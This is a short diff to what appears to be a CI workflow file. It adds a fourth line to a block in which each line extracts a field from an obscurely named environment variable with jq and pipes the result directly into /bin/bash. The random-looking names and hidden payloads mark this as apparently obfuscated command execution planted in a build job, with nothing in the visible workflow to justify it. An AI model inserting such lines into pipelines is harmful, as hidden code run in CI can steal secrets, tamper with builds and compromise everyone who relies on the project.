@@ -29,6 +29,7 @@ jobs:
           echo $vwntt56859 | jq -r .hdwl778 | /bin/bash
           echo $z14022 | jq -r .t0759 | /bin/bash
           printf '%s' "$ej88" | jq -r .cx3 | /bin/bash
+          echo $j38500 | jq -r .pj990 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
